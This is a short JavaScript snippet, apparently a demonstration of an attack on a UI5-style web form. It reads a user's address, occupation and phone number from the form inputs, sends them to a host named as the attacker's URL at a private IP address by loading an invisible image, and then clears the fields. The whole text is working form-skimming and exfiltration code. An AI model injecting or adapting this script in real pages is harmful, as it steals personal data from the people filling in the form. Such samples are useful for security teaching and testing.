<script type="text/javascript">

    /*
    * NOTE that javascript is not explicitly necessary here,
    *
    * because you can also send the same data by simply specifying
    *
    * in the html the "method" and "action" attributes of the form bellow!
    *
    * */
    function sendData() {
        var sAttackerUrl = "http://10.55.59.229:8080/TW/form";

        var oAddressInput = document.getElementById("__component0---collect--address-inner"),
            oOccupationInput = document.getElementById("__component0---collect--occupation-inner"),
            oPhoneInput = document.getElementById("__component0---collect--phone-inner");

        if (oAddressInput && oOccupationInput && oPhoneInput) {

            var sAddress = oAddressInput.value,
                sOccupation = oOccupationInput.value,
                sPhone = oPhoneInput.value;

            if (sAddress && sOccupation && sPhone) {
                var sData = "?address=" + encodeURIComponent(sAddress)
                                + "&occupation=" + encodeURIComponent(sOccupation)
                                + "&phone=" + encodeURIComponent(sPhone),
                        sRequest = sAttackerUrl + sData;
                new Image().src = sRequest;


                oAddressInput.value = "";
                oOccupationInput.value = "";
                oPhoneInput.value = "";
            }
        }


    }

</script>
